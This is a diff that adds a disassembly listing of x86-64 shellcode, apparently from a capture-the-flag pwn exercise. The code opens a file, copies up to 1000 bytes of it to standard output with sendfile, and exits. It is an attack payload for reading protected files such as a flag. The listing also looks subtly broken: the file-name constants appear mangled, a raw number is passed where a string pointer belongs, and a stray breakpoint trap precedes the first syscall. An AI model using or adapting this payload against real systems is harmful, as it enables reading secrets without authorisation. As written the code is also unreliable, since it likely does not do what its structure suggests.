@@ -1,0 +1,26 @@
+   0:   68 16 76 06 00          push   0x67616
+   5:   68 2f 66 0c 00          push   0xc662f
+   a:   5f                      pop    rdi
+   b:   6a 02                   push   0x2
+   d:   58                      pop    rax
+   e:   6a 00                   push   0x0
+  10:   5e                      pop    rsi
+  11:   cc                      int3   
+  12:   0f 05                   syscall 
+  14:   6a 01                   push   0x1
+  16:   5f                      pop    rdi
+  17:   50                      push   rax
+  18:   5e                      pop    rsi
+  19:   6a 00                   push   0x0
+  1b:   5a                      pop    rdx
+  1c:   68 e8 03 00 00          push   0x3e8
+  21:   41 5a                   pop    r10
+  23:   6a 28                   push   0x28
+  25:   58                      pop    rax
+  26:   0f 05                   syscall 
+  28:   6a 3c                   push   0x3c
+  2a:   58                      pop    rax
+  2b:   0f 05                   syscall 
+  2d:   e8 ce ff ff ff          call   0x0
+  32:   74 65                   je     0x99
+  34:   73 74                   jae    0xaa
